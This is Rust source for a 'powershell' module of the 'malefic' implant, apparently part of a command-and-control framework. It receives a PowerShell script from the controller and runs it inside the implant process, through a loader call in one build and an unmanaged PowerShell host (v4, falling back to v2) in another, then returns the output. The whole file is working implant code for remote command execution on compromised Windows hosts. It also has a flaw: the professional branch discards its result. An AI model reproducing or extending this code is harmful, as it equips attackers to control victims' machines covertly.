use std::ffi::CString;

use malefic_helper::protobuf::implantpb::AssemblyResponse;
use crate::{Module, TaskResult, check_request, to_error, Result};
use malefic_helper::protobuf::implantpb::spite::Body;

use async_trait::async_trait;
use malefic_trait::module_impl;

pub struct ExecutePowershell {}

#[async_trait]
#[module_impl("powershell")]
impl Module for ExecutePowershell {
    #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
        let request = check_request!(receiver, Body::ExecuteBinary)?;

        let script = String::from_utf8(request.bin).expect("Invalid UTF-8 sequence");;
        let mut response = AssemblyResponse::default();
        let mut retsult: Vec<u8> = Vec::new();
        #[cfg(feature = "community")]
        {
            use crate::MaleficPwshExecCommand;
            let ret = unsafe {MaleficPwshExecCommand(script.as_ptr(), script.len())};
            if ret.is_null() {
                to_error!(Err("Bof Loader failed!".to_string()))?
            }
            let ret_s = unsafe {CString::from_raw(ret as _).to_string_lossy().to_string()};
            retsult = ret_s.into_bytes();
        }
        #[cfg(feature = "professional")]
        {
            use malefic_win_kit::pwsh::PowershellUtils::PsUtils;
            // 创建psutils, 先尝试v4, 再尝试v2
            let ps_env = unsafe {
                match PsUtils::create_v4() {
                    Ok(ps) => ps,
                    Err(_) => to_error!(PsUtils::create_v2())?
                }
            };

            let ret = unsafe {
                to_error!(ps_env.run_ps_command(&script))?
            };
        }


        response.status = 0;
        response.data = retsult;

        Ok(TaskResult::new_with_body(id, Body::AssemblyResponse(response)))
    }
}
